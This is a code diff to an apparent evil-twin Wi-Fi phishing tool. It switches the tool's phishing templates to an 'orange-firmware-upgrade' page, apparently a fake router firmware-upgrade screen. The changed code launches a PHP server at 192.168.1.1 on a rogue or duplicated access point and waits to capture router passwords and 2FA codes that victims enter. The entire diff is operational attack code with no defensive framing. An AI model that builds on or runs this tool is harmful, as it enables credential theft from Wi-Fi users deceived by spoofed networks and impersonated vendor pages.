@@ -289,7 +289,7 @@ def read_file(attack_type):
             readFile_2fa = f.readlines()
         return readFile_user, readFile_2fa
     else:
-        with open("./ETwin-templates/firmware-upgrade/router-pass.txt", "r") as f:
+        with open("./ETwin-templates/orange-firmware-upgrade/router-pass.txt", "r") as f:
             readFile_user = f.readlines()
         return readFile_user
 
@@ -588,7 +588,7 @@ def attack_func(network_interface, attack_mode):
             print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Starting PHP Server...'}")
             time.sleep(3)
             print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + ' [!] Press CTRL+C to stop the attack.'}")
-            php_server = os.system(f"cd ETwin-templates/login-temp;xterm -hold -e sudo php -S 192.168.1.1:80 &")
+            php_server = os.system(f"cd ETwin-templates/orange-firmware-upgrade;xterm -hold -e sudo php -S 192.168.1.1:80 &")
             print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Waiting for Credentials..'}")
             print(Fore.WHITE)
             getCredentials("newAccessPoint")
@@ -655,7 +655,7 @@ def attack_func(network_interface, attack_mode):
             print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Starting PHP Server...'}")
             time.sleep(3)
             print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + ' [!] Press CTRL+C to stop the attack.'}")
-            php_server = os.system(f"cd ETwin-templates/firmware-upgrade;xterm -hold -e sudo php -S 192.168.1.1:80 &")
+            php_server = os.system(f"cd ETwin-templates/orange-firmware-upgrade;xterm -hold -e sudo php -S 192.168.1.1:80 &")
             print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Waiting for Credentials..'}")
             print(Fore.WHITE)
             getCredentials("dupAccesPoint")
